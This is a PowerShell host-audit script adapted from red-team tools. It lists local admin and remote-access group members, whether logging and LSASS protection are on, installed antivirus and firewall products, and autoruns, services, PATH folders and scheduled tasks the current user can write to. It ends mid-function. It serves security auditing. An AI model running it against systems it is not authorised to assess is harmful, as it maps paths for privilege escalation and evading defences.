function Get-LocalAdministrators {
    $group = get-wmiobject win32_group -ComputerName $env:COMPUTERNAME -Filter "LocalAccount=True AND SID='S-1-5-32-544'"
    $query = "GroupComponent = `"Win32_Group.Domain='$($group.domain)'`,Name='$($group.name)'`""
    $list = Get-WmiObject win32_groupuser -Filter $query | foreach {[wmi]$_.PartComponent} 
    return $list 
}
function Get-LocalPSRemote {
    $group = get-wmiobject win32_group -ComputerName $env:COMPUTERNAME -Filter "LocalAccount=True AND SID='S-1-5-32-580'"
    $query = "GroupComponent = `"Win32_Group.Domain='$($group.domain)'`,Name='$($group.name)'`""
    $list = Get-WmiObject win32_groupuser -Filter $query | foreach {[wmi]$_.PartComponent} 
    return $list 
}
function Get-LocalRDP {
    $group = get-wmiobject win32_group -ComputerName $env:COMPUTERNAME -Filter "LocalAccount=True AND SID='S-1-5-32-555'"
    $query = "GroupComponent = `"Win32_Group.Domain='$($group.domain)'`,Name='$($group.name)'`""
    $list = Get-WmiObject win32_groupuser -Filter $query | foreach {[wmi]$_.PartComponent} 
    return $list 
}
function Get-LocalDCOM {
    $group = get-wmiobject win32_group -ComputerName $env:COMPUTERNAME -Filter "LocalAccount=True AND SID='S-1-5-32-562'"
    $query = "GroupComponent = `"Win32_Group.Domain='$($group.domain)'`,Name='$($group.name)'`""
    $list = Get-WmiObject win32_groupuser -Filter $query | foreach {[wmi]$_.PartComponent} 
    return $list 
}
function Get-LocalPasswordNotRequired {
    return (Get-WmiObject -Class Win32_UserAccount -Filter  "LocalAccount='True' AND PasswordRequired='False'")
}
function Get-SysInfo {
    <#
    Modified https://github.com/threatexpress/red-team-scripts/blob/master/HostEnum.ps1
    .SYNOPSIS
    Get basic system information from the host
    #>
    $os_info = Get-WmiObject Win32_OperatingSystem
    $date = Get-Date
    $SysInfoHash = @{            
        HostName                = $ENV:COMPUTERNAME                         
        IPAddresses             = (@([System.Net.Dns]::GetHostAddresses($ENV:HOSTNAME)) | %{$_.IPAddressToString}) -join ", "        
        OS                      = $os_info.caption + ' ' + $os_info.CSDVersion     
        Architecture            = $os_info.OSArchitecture   
        "Date(UTC)"             = $date.ToUniversalTime()| Get-Date -uformat  "%Y%m%d%H%M%S"
        "Date(LOCAL)"           = $date | Get-Date -uformat  "%Y%m%d%H%M%S%Z"
        InstallDate             = $os_info.InstallDate
        Username                = $ENV:USERNAME           
        Domain                  = (GWMI Win32_ComputerSystem).domain            
        LogonServer             = $ENV:LOGONSERVER
        DotNetVersion           = ((Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\*').PSChildName -join ', ')
        PSVersion               = $PSVersionTable.PSVersion.ToString()
        PSCompatibleVersions    = ($PSVersionTable.PSCompatibleVersions) -join ', '
        PSScriptBlockLogging    = If((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -EA 0).EnableScriptBlockLogging -eq 1){"Enabled"} Else {"Disabled"}
        PSTranscription         = If((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription -EA 0).EnableTranscripting -eq 1){"Enabled"} Else {"Disabled"}
        PSTranscriptionDir      = (Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription -EA 0).OutputDirectory
        PSModuleLogging         = If((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging -EA 0).EnableModuleLogging -eq 1){"Enabled"} Else {"Disabled"}
        LsassProtection         = If((Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -EA 0).RunAsPPL -eq 1){"Enabled"} Else {"Disabled"}
        LAPS                    = If((Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft Services\AdmPwd" -EA 0).AdmPwdEnabled -eq 1){"Enabled"} Else {"Disabled"}
        UACLocalAccountTokenFilterPolicy = If((Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -EA 0).LocalAccountTokenFilterPolicy -eq 1){"Disabled (PTH likely w/ non-RID500 Local Admins)"} Else {"Enabled (Remote Administration restricted for non-RID500 Local Admins)"}
        UACFilterAdministratorToken = If((Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -EA 0).FilterAdministratorToken -eq 1){"Enabled (RID500 protected)"} Else {"Disabled (PTH likely with RID500 Account)"}
        DenyRDPConnections      = [bool](Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -EA 0).FDenyTSConnections
        LocalAdmins             = ((Get-LocalAdministrators).name -join ', ')
        LocalPSRemote           = ((Get-LocalPSRemote).name -join ', ')
        LocalDCOM               = ((Get-LocalDCOM).name -join ', ')
        LocalRDP                = ((Get-LocalRDP).name -join ', ')
        LocalPasswordNotReq     = ((Get-LocalPasswordNotRequired).name -join ', ')
        SMBv1                   = [bool](Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol)
    }      
    # PS feels the need to randomly re-order everything when converted to an object so let's presort
    $SysInfoObject = New-Object -TypeName PSobject -Property $SysInfoHash 
    return $SysInfoObject | Select-Object Hostname, OS, Architecture, "Date(UTC)", "Date(Local)", InstallDate, IPAddresses, Domain, Username, LogonServer, DotNetVersion, PSVersion, PSCompatibleVersions, PSScriptBlockLogging, PSTranscription, PSTranscriptionDir, PSModuleLogging, LSASSProtection, LAPS, UACLocalAccountTokenFilterPolicy, UACFilterAdministratorToken, DENYRDPCONNECTIONS, LOCALADMINS,LocalPSRemote,LocalDCOM,LocalRDP,LocalPasswordNotReq, SMBv1    
}
function Get-LocalSecurityProducts {
    <#
    Modified https://github.com/HarmJ0y/WINspect/blob/master/WINspect.ps1
    .SYNOPSIS		
	Gets Windows Firewall Profile status and checks for installed third party security products.		
    .DESCRIPTION
    This function operates by examining registry keys specific to the Windows Firewall and by using the 
    Windows Security Center to get information regarding installed security products.            
    .NOTE
    The documentation in the msdn is not very clear regarding the productState property provided by
    the SecurityCenter2 namespace. For this reason, this function only uses available informations that were obtained by testing 
    different security products againt the Windows API.                    
    .LINK
    http://neophob.com/2010/03/wmi-query-windows-securitycenter2
    #>
    $SecInfoHash = @{}
    $firewallPolicySubkey="HKLM:\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy"
    try{
	    if(Test-Path -Path $($firewallPolicySubkey+"\StandardProfile")){
            $enabled = $(Get-ItemProperty -Path $($firewallPolicySubkey+"\StandardProfile") -Name EnableFirewall).EnableFirewall  
            if($enabled -eq 1){
                $standardProfile="Enabled"
            }
            else{
                $standardProfile="Disabled"
            }
            $SecInfoHash.Add("Standard Profile Firewall",$standardProfile)
        }else{
            Write-Warning  "[-] Could not find Standard Profile Registry Subkey"
	    }    
        if(Test-Path -Path $($firewallPolicySubkey+"\PublicProfile")){
            $enabled = $(Get-ItemProperty -Path $($firewallPolicySubkey+"\PublicProfile") -Name EnableFirewall).EnableFirewall  
            if($enabled -eq 1){
                $publicProfile="Enabled"
            }
            else{
                $publicProfile="Disabled"
            }
            $SecInfoHash.Add("Public Profile Firewall",$publicProfile)
        }else{
	        Write-Output "[-] Could not find Public Profile Registry Subkey"
        }
        if(Test-Path -Path $($firewallPolicySubkey+"\DomainProfile")){
            $enabled = (Get-ItemProperty -Path $($firewallPolicySubkey+"\DomainProfile") -Name EnableFirewall).EnableFirewall  
            if($enabled -eq 1){
                $domainProfile="Enabled"
            }else{
                $domainProfile="Disabled"
            }
            $SecInfoHash.Add("Domain Profile Firewall", $domainProfile)
        }else{       
            Write-Warning "[-] Could not find Private Profile Registry Subkey"
	    }              
    }catch{
        Write-Output "[-] $($_.Exception.Message)"
    	Write-Warning -Message "[-] Error : Could not check Windows Firewall registry informations"	
    }
    $role = $(get-wmiObject -Class Win32_ComputerSystem).DomainRole
    if($role -ne 0 -and $role -ne 1){
        return ($SecInfoHash | Format-List)
    }
    $SecurityProvider=@{         
        "00" = "None";
        "01" = "Firewall";
        "02" = "AutoUpdate_Settings";
        "04" = "AntiVirus";           
        "08" = "AntiSpyware";
        "10" = "Internet_Settings";
        "20" = "User_Account_Control";
        "40" = "Service"
    }
    $RealTimeBehavior = @{                              
        "00" = "Off";
        "01" = "Expired";
        "10" = "ON";
        "11" = "Snoozed"
    }
    $DefinitionStatus = @{
        "00" = "Up-to-date";
        "10" = "Out-of-date"
    }
    if(Get-WmiObject -Namespace root -class __NAMESPACE -filter "name='SecurityCenter2'"){
        $securityCenterNS="root\SecurityCenter2"
    }else{
        $securityCenterNS="root\SecurityCenter"
    }       
    # checks for third party firewall products 
    #Write-Output "`n[*] Checking for third party Firewall products" 
    try {  
        $firewalls= @(Get-WmiObject -Namespace $securityCenterNS -class FirewallProduct)
        if($firewalls.Count -eq 0){
	        $SecInfoHash.Add("FW from third party?", $false)
        }else{
            $firewalls| foreach {
                $SecInfoHash.Add("FW from third party?", $true)
                # The structure of the API is different depending on the version of the SecurityCenter Namespace
                if($securityCenterNS.endswith("2")){
                    [int]$productState=$_.ProductState
            	    $hexString=[System.Convert]::toString($productState,16).padleft(6,'0')
                    $provider=$hexString.substring(0,2)
                    $realTimeProtec=$hexString.substring(2,2)
                    $definition=$hexString.substring(4,2)
                    $SecInfoHash.Add("FW Product Name", $($_.displayName))
                    $SecInfoHash.Add("FW Service Type", $($SecurityProvider[[String]$provider]))
                    $SecInfoHash.Add("FW State       ", $($RealTimeBehavior[[String]$realTimeProtec]))
                }else{
                    $SecInfoHash.Add("FW Company Name", $($_.CompanyName))
                    $SecInfoHash.Add("FW Product Name", $($_.displayName))
                    $SecInfoHash.Add("FW State       ", $($_.enabled))
                }
            }
        }
        # checks for antivirus products
        #Write-Output "`n[*] Checking for installed antivirus products" 
        $antivirus=@(Get-WmiObject -Namespace $securityCenterNS -class AntiVirusProduct)
        if($antivirus.Count -eq 0){
            $SecInfoHash.Add("AntiVirus installed?", $false)
        }else{
            $SecInfoHash.Add("AntiVirus installed?", $true)
        	$antivirus| foreach {
                if($securityCenterNS.endswith("2")){
                 	[int]$productState=$_.ProductState
                    $hexString=[System.Convert]::toString($productState,16).padleft(6,'0')
                    $provider=$hexString.substring(0,2)
                    $realTimeProtec=$hexString.substring(2,2)
                    $definition=$hexString.substring(4,2)
                    $SecInfoHash.Add("AV Product Name         ",$($_.displayName))
                    $SecInfoHash.Add("AV Service Type         ",$($SecurityProvider[[String]$provider]))
                    $SecInfoHash.Add("AV Real Time Protection ",$($RealTimeBehavior[[String]$realTimeProtec]))
                    $SecInfoHash.Add("AV Signature Definitions",$($DefinitionStatus[[String]$definition]))
                }else{
                    $SecInfoHash.Add("AV Company Name        ",$($_.CompanyName))
                    $SecInfoHash.Add("AV Product Name        ",$($_.displayName))
                    $SecInfoHash.Add("AV Real Time Protection",$($_.onAccessScanningEnabled))
                    $SecInfoHash.Add("AV Product up-to-date  ",$($_.productUpToDate))
                }
            }
        }
        # Checks for antispyware products
	    #Write-Output "`n[*] Checking for installed antispyware products" 
        $antispyware=@(Get-WmiObject -Namespace $securityCenterNS -class AntiSpywareProduct)
        if($antispyware.Count -eq 0){
            $SecInfoHash.Add("AntiSpyware installed?", $false)     
        }else{ 
            $SecInfoHash.Add("AntiSpyware installed?", $true)   
            $antispyware| foreach {
		        if($securityCenterNS.endswith("2")){
                    [int]$productState=$_.ProductState
                    $hexString=[System.Convert]::toString($productState,16).padleft(6,'0')
                    $provider=$hexString.substring(0,2)
                    $realTimeProtec=$hexString.substring(2,2)
                    $definition=$hexString.substring(4,2)
                    $SecInfoHash.Add("Spyware Product Name         ", $($_.displayName))
                    $SecInfoHash.Add("Spyware Service Type         ", $($SecurityProvider[[String]$provider]))
                    $SecInfoHash.Add("Spyware Real Time Protection ", $($RealTimeBehavior[[String]$realTimeProtec]))
                    $SecInfoHash.Add("Spyware Signature Definitions", $($DefinitionStatus[[String]$definition]))
                }else{
                    $SecInfoHash.Add("Spyware Company Name         ", $($_.CompanyName)) 
                    $SecInfoHash.Add("Spyware Product Name         ", $($_.displayName))
                    $SecInfoHash.Add("Spyware Real Time Protection ", $($_.onAccessScanningEnabled))
                    $SecInfoHash.Add("Spyware Product up-to-date   ", $($_.productUpToDate))
                }
            }
        }
    }catch{
        Write-Output "[-] $($_.Exception.Message)"
    }
    $SecObject = New-Object -TypeName PSobject -Property $SecInfoHash
    return $SecObject | Select-Object 'Domain Profile Firewall','Standard Profile Firewall','Public Profile Firewall','AntiVirus installed?','AV*','AntiSpyware installed?','Spyware*','FW*'
}
function Get-ModifiablePath {
    <#
    .SYNOPSIS
    Modified Version of https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1

    Parses a passed string containing multiple possible file/folder paths and returns
    the file paths with acls
    Author: Will Schroeder (@harmj0y)  
    License: BSD 3-Clause  
    Required Dependencies: None  
    .DESCRIPTION
    Takes a complex path specification of an initial file/folder path with possible
    configuration files, 'tokenizes' the string in a number of possible ways, and
    enumerates the ACLs for each path that currently exists on the system. Any path that
    the current user has modification rights on is returned in a custom object that contains
    the modifiable path, associated permission set, and the IdentityReference with the specified
    rights. The SID of the current user and any group he/she are a part of are used as the
    comparison set against the parsed path DACLs.
    .PARAMETER SkipUser
    Ignore ACL's for these usernames
    .PARAMETER Path
    The string path to parse for modifiable files. Required
    .PARAMETER Literal
    Switch. Treat all paths as literal (i.e. don't do 'tokenization').
    .EXAMPLE
    '"C:\Temp\blah.exe" -f "C:\Temp\config.ini"' | Get-ModifiablePath
    Path                       Permissions                IdentityReference
    ----                       -----------                -----------------
    C:\Temp\blah.exe           {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
    C:\Temp\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
    .EXAMPLE
    Get-ChildItem C:\Vuln\ -Recurse | Get-ModifiablePath
    Path                       Permissions                IdentityReference
    ----                       -----------                -----------------
    C:\Vuln\blah.bat           {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
    C:\Vuln\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
    ...
    .OUTPUTS
    PowerUp.TokenPrivilege.ModifiablePath
    Custom PSObject containing the Permissions, ModifiablePath, IdentityReference for
    a modifiable path.
    #>
    
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiablePath')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,

        [Alias('LiteralPaths')]
        [Switch]
        $Literal,

        [string[]]$SkipUser
    )

    BEGIN {
        # from http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
        $AccessMask = @{
            [uint32]'0x80000000' = 'GenericRead'
            [uint32]'0x40000000' = 'GenericWrite'
            [uint32]'0x20000000' = 'GenericExecute'
            [uint32]'0x10000000' = 'GenericAll'
            [uint32]'0x02000000' = 'MaximumAllowed'
            [uint32]'0x01000000' = 'AccessSystemSecurity'
            [uint32]'0x00100000' = 'Synchronize'
            [uint32]'0x00080000' = 'WriteOwner'
            [uint32]'0x00040000' = 'WriteDAC'
            [uint32]'0x00020000' = 'ReadControl'
            [uint32]'0x00010000' = 'Delete'
            [uint32]'0x00000100' = 'WriteAttributes'
            [uint32]'0x00000080' = 'ReadAttributes'
            [uint32]'0x00000040' = 'DeleteChild'
            [uint32]'0x00000020' = 'Execute/Traverse'
            [uint32]'0x00000010' = 'WriteExtendedAttributes'
            [uint32]'0x00000008' = 'ReadExtendedAttributes'
            [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
            [uint32]'0x00000002' = 'WriteData/AddFile'
            [uint32]'0x00000001' = 'ReadData/ListDirectory'
        }
    }
    PROCESS {
        ForEach($TargetPath in $Path) {
            #$CandidatePaths = @()
            ## possible separator character combinations
            #$SeparationCharacterSets = @('"', "'", ' ', "`"'", '" ', "' ", "`"' ")
            #if ($PSBoundParameters['Literal']) {
            #    $TempPath = $([System.Environment]::ExpandEnvironmentVariables($TargetPath))
            #    if (Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
            #        $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
            #    }
            #    else {
            #        # if the path doesn't exist, check if the parent folder allows for modification
            #        $ParentPath = Split-Path -Path $TempPath -Parent  -ErrorAction SilentlyContinue
            #        if ($ParentPath -and (Test-Path -Path $ParentPath)) {
            #            $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
            #        }
            #    }
            #}
            #else {
            #    ForEach($SeparationCharacterSet in $SeparationCharacterSets) {
            #        $TargetPath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {
            #            if (($SeparationCharacterSet -notmatch ' ')) {
            #                $TempPath = $([System.Environment]::ExpandEnvironmentVariables($_)).Trim()
            #                if ($TempPath -and ($TempPath -ne '')) {
            #                    if (Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
            #                        # if the path exists, resolve it and add it to the candidate list
            #                        $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
            #                    }
            #                    else {
            #                        # if the path doesn't exist, check if the parent folder allows for modification
            #                        try {
            #                            $ParentPath = (Split-Path -Path $TempPath -Parent -ErrorAction SilentlyContinue).Trim()
            #                            if ($ParentPath -and ($ParentPath -ne '') -and (Test-Path -Path $ParentPath  -ErrorAction SilentlyContinue)) {
            #                                $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
            #                            }
            #                        }
            #                        catch {}
            #                    }
            #                }
            #            }
            #            else {
            #                # if the separator contains a space
            #                $CandidatePaths += Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | ForEach-Object {$_.Trim()} | Where-Object {($_ -ne '') -and (Test-Path -Path $_)}
            #            }
            #        }
            #    }
            #}
            #$CandidatePaths makes the scan from to be 4 seconds to 7.5 seconds
            $TargetPath | Sort-Object -Unique | ForEach-Object {
                $CandidatePath = $_
                Get-Acl -Path $CandidatePath | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {
                    $FileSystemRights = $_.FileSystemRights.value__
                    if($SkipUser){
                        foreach($Admin in $SkipUser){
                            if($_.IdentityReference -match $Admin){
                                $Skip = $true
                            }
                        }
                        if(-not($Skip)){
                            $Permissions = $AccessMask.Keys | Where-Object { $FileSystemRights -band $_ } | ForEach-Object { $AccessMask[$_] }
                            # the set of permission types that allow for modification
                            $Comparison = Compare-Object -ReferenceObject $Permissions -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent
                            if ($Comparison) {
                                $Out = New-Object PSObject
                                $Out | Add-Member Noteproperty 'ModifiablePath' $CandidatePath
                                $Out | Add-Member Noteproperty 'IdentityReference' $_.IdentityReference
                                $Out | Add-Member Noteproperty 'Permissions' $($Permissions -join ', ')
                                $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiablePath')
                                return $Out
                            }
                        }
                    }else{
                        $Permissions = $AccessMask.Keys | Where-Object { $FileSystemRights -band $_ } | ForEach-Object { $AccessMask[$_] }
                        # the set of permission types that allow for modification
                        $Comparison = Compare-Object -ReferenceObject $Permissions -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent
                        if ($Comparison) {
                            $Out = New-Object PSObject
                            $Out | Add-Member Noteproperty 'ModifiablePath' $CandidatePath
                            $Out | Add-Member Noteproperty 'IdentityReference' $_.IdentityReference
                            $Out | Add-Member Noteproperty 'Permissions' $($Permissions -join ', ')
                            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiablePath')
                            return $Out
                        }
                    }
                }
            }
        }
    }
}
function Get-ActiveListeners {
    <#
    https://github.com/threatexpress/red-team-scripts/blob/master/HostEnum.ps1
    .SYNOPSIS
    Enumerates active TCP/UDP listeners.
    #>
    Write-Verbose "Enumerating active TCP/UDP listeners..."
    $list = New-Object System.Collections.ArrayList
    $IPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()         
    $TcpListeners = $IPProperties.GetActiveTCPListeners()
    $UdpListeners = $IPProperties.GetActiveUDPListeners()
            
    ForEach($Connection in $TcpListeners) {            
        if($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }                 
        $object = New-Object -TypeName PSobject -Property @{          
            "Protocol"      = "TCP"
            "LocalAddress"  = $Connection.Address            
            "ListeningPort" = $Connection.Port            
            "IPVersion"     = $IPType
        }
        $list.add($object) | Out-Null
    }
    ForEach($Connection in $UdpListeners) {            
        if($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }                 
        $object = New-Object -TypeName PSobject -Property @{          
            "Protocol"      = "UDP"
            "LocalAddress"  = $Connection.Address            
            "ListeningPort" = $Connection.Port            
            "IPVersion"     = $IPType
        }
        $list.add($object) | Out-Null
    }
    return $list
}
function Get-WriteableAutoRuns {
    <#
    Modified https://github.com/A-mIn3/WINspect
    .SYNOPSIS
    Looks for autoruns specified in different places in the registry.
    .DESCRIPTION
    This function inspects common registry keys used for autoruns.
    It examines the properties of these keys and report any found executables along with their pathnames.
    #>
    param(
        [string[]]$SkipUser
    )
    $list = New-Object System.Collections.ArrayList
    $adminPATH = @()
    if(-not(Get-PSDrive | where {$_.name -like 'HKU'})){
        New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS | Out-Null
    }
    $sids=(Get-LocalAdministrators).sid
    foreach($sid in $sids){
        $adminPATH += "HKU:\$sid\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"
        $adminPATH += "HKU:\$sid\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"
        $adminPATH += "HKU:\$sid\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\"
        $adminPATH += "HKU:\$sid\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices"
        $adminPATH += "HKU:\$sid\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices"
        $adminPATH += "HKU:\$sid\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\load"
        $adminPATH += "HKU:\$sid\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"
    }
    $RegistryKeys = @( 
        $adminPATH
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce",
        "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\load",
        "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\",
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices\",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce",
        "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService",
        "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService", 
        "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute",
        "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows",
        "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs", # DLLs specified in this entry can hijack any process that uses user32.dll 
        "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell",
        "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify",
        "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit",
        "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\SharedTaskScheduler,"
        "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad"
        # not sure if it is all we need to check!
    )
    $RegistryKeys | Sort-Object -Unique | foreach {
        $key = $_
        if(Test-Path -Path $key){
            [array]$properties = get-item $key | Select-Object -ExpandProperty Property
            if($properties.Count -gt 0){
                foreach($exe in $properties) {
                    $path = (Get-ItemProperty $key).$exe.replace('"','')
                    $pathname = $($path.subString(0, $path.toLower().IndexOf(".exe")+4)).trim('"')
                    if(-not($pathname)){
                        $pathname = $path.split('/')[0]
                    }
                    if(Test-Path -Path $pathname){
                        #File acl
                        $fileacl = Get-ModifiablePath -Path $pathname -SkipUser $SkipUser
                        if($fileacl){
                            $list.Add($fileacl) | Out-Null
                        }
                        #Dir acl
                        $dir = (Get-ChildItem $pathname).DirectoryName
                        $diracl = Get-ModifiablePath -Path $dir -SkipUser $SkipUser
                        if($diracl){
                            $list.Add($diracl) | Out-Null
                        }
                    }
                }
            }
        }
    }
    if($list.Count -eq 0){
        return "[+] Found No Weird AutoRuns."
    }else{
        return $list
    }
}
function Get-WritableAdminPath { 
    <#
    Modified https://github.com/A-mIn3/WINspect
    .SYNOPSIS
    Checks DLL Search mode and inspects permissions for directories in system %PATH%
    .DESCRIPTION
    inspects write access to directories in the path environment variable .
    #>
    param(
        [string[]]$SkipUser
    )
    $list = New-Object System.Collections.ArrayList
    $adminPATH = @()
    if(-not(Get-PSDrive | where {$_.name -like 'HKU'})){
        New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS | Out-Null
    }
    $sids=(Get-LocalAdministrators).sid
    foreach($sid in $sids){
        try{
            $adminPATH += ((Get-ItemProperty HKU:\$sid\Environment\ -Name Path -ErrorAction SilentlyContinue).Path.split(';') | where {$_})
        }catch{}
    }
    $systemPATH = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name PATH).PATH.split(';')
    $PATH = $adminPATH + $systemPATH | Sort-Object -Unique
    foreach($pathname in $PATH) {
        if(($pathname) -and (Test-Path $pathname)){
            #Dir acl
            $diracl = Get-ModifiablePath -Path $pathname -SkipUser $SkipUser
            #Add dir to list
            if($diracl){
                $list.Add($diracl) | Out-Null
            }
	    }
    }
    if($list.Count -eq 0){
        return "[+] Non Writeable Admin Path Found"
    }else{
        return $list
    }
}
function Get-WritableServices {
    <#
    .SYNOPSIS
    Gets services binaries and folders with permission  
    .DESCRIPTION
    This function checks services that have writable binaries and folders,
    returns an array containing service objects.
    #>
    param(
        [string[]]$SkipUser
    )
    $list = New-Object System.Collections.ArrayList
    $services = Get-WmiObject -Class Win32_Service | where {$_.pathname}
    foreach($Service in $services) {
        $pathname = $($service.pathname.subString(0, $service.pathname.toLower().IndexOf(".exe")+4)).trim('"')
        if(-not($pathname)){
            $pathname = $service.pathname
        }
        if(($pathname) -and (Test-Path $pathname)){
            #File acl
            $fileacl = Get-ModifiablePath -Path $pathname -SkipUser $SkipUser
            if($fileacl){
                $list.Add($fileacl) | Out-Null
            }
            #Dir acl
            $dir = (Get-ChildItem $pathname).DirectoryName
            $diracl = Get-ModifiablePath -Path $dir -SkipUser $SkipUser
            if($diracl){
                $list.Add($diracl) | Out-Null
            }
        }
    }
    if($list.Count -eq 0){
        return "[+] Non Writeable Service Path Found"
    }else{
        return $list
    }
}
function Get-WriteableScheduledTasks {
    <#
    .SYNOPSIS
    Gets scheduled tasks binaries and folders with permission  
    .DESCRIPTION
    This function looks for scheduled tasks that have writeable binaries and folders
    .NOTE
    This functions uses the schtasks.exe utility to get informations about
    scheduled task and then tries to parse the results. Here I choose to parse XML output from the command.
    Another approach would be using the ScheduledTask Powershell module that was introduced starting from version 3.0 .
    #>
    param(
        [string[]]$SkipUser
    )
    $list = New-Object System.Collections.ArrayList
    [xml]$tasksXMLobj = $(schtasks.exe /query /xml ONE)
    foreach($task in $tasksXMLobj.Tasks.Task) {
        $pathname = [System.Environment]::ExpandEnvironmentVariables($task.actions.exec.command).trim()
        if(($pathname) -and (Test-Path $pathname)){
            #File acl
            $fileacl = Get-ModifiablePath -Path $pathname -SkipUser $SkipUser
            if($fileacl){
                $list.Add($fileacl) | Out-Null
            }
            #Dir acl
            $dir = (Get-ChildItem $pathname).DirectoryName
            $diracl = Get-ModifiablePath -Path $dir -SkipUser $SkipUser
            if($diracl){
                $list.Add($diracl) | Out-Null
            }
        }
    }
    if($list.Count -eq 0){
        return "[+] Non Writeable Scheduled Task Path Found"
    }else{
        return $list
    }
}
function Get-LocalShares {
